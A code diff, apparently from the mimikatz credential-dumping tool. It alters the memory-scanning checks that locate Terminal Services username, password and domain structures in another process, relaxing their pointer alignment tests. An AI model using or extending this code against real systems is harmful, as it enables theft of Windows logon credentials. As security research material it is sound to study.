@@ -272,14 +272,13 @@ BOOL CALLBACK kuhl_m_ts_logonpasswords_MemoryAnalysis(PMEMORY_BASIC_INFORMATION 
 					{
 						pWebKiwiData = (PWTS_WEB_KIWI) CurrentPtr;
 						if(
-							(pWebKiwiData->Username.Buffer && !((ULONG_PTR) pWebKiwiData->Username.Buffer % sizeof(PVOID)) && ((ULONG_PTR) pWebKiwiData->Username.Buffer < 0x1000))
+							(pWebKiwiData->Username.Buffer && !((ULONG_PTR) pWebKiwiData->Username.Buffer % 2) && ((ULONG_PTR) pWebKiwiData->Username.Buffer < 0x1000))
 							&&
 							(pWebKiwiData->Username.Length && !(pWebKiwiData->Username.Length % sizeof(wchar_t)) && (pWebKiwiData->Username.Length < ((WTS_USERNAME_LENGTH + 1) * sizeof(wchar_t))) && ((pWebKiwiData->Username.Length == pWebKiwiData->Username.MaximumLength) || (pWebKiwiData->Username.Length == (pWebKiwiData->Username.MaximumLength - sizeof(wchar_t)))))
 							)
 						{
-
 							if(
-								(pWebKiwiData->Password.Buffer && !((ULONG_PTR) pWebKiwiData->Password.Buffer % sizeof(PVOID)) && ((ULONG_PTR) pWebKiwiData->Password.Buffer < 0x1000))
+								(pWebKiwiData->Password.Buffer && !((ULONG_PTR) pWebKiwiData->Password.Buffer % 2) && ((ULONG_PTR) pWebKiwiData->Password.Buffer < 0x1000))
 								&&
 								(pWebKiwiData->Password.Length && !(pWebKiwiData->Password.Length % sizeof(wchar_t)) && (pWebKiwiData->Password.Length < ((WTS_PASSWORD_LENGTH + 1) * sizeof(wchar_t))) && ((pWebKiwiData->Password.Length == pWebKiwiData->Password.MaximumLength) || (pWebKiwiData->Password.Length == (pWebKiwiData->Password.MaximumLength - sizeof(wchar_t)))))
 								)
@@ -289,7 +288,7 @@ BOOL CALLBACK kuhl_m_ts_logonpasswords_MemoryAnalysis(PMEMORY_BASIC_INFORMATION 
 								ref = (PBYTE) aProcess.address + (CurrentPtr - (PBYTE) aLocalBuffer.address);
 
 								if(
-									(pWebKiwiData->Domain.Buffer && !((ULONG_PTR) pWebKiwiData->Domain.Buffer % sizeof(PVOID)) && ((ULONG_PTR) pWebKiwiData->Domain.Buffer < 0x1000))
+									(pWebKiwiData->Domain.Buffer && !((ULONG_PTR) pWebKiwiData->Domain.Buffer % 2) && ((ULONG_PTR) pWebKiwiData->Domain.Buffer < 0x1000))
 									&&
 									(pWebKiwiData->Domain.Length && !(pWebKiwiData->Domain.Length % sizeof(wchar_t)) && (pWebKiwiData->Domain.Length < ((WTS_DOMAIN_LENGTH + 1) * sizeof(wchar_t))) && ((pWebKiwiData->Domain.Length == pWebKiwiData->Domain.MaximumLength) || (pWebKiwiData->Domain.Length == (pWebKiwiData->Domain.MaximumLength - sizeof(wchar_t)))))
 									)
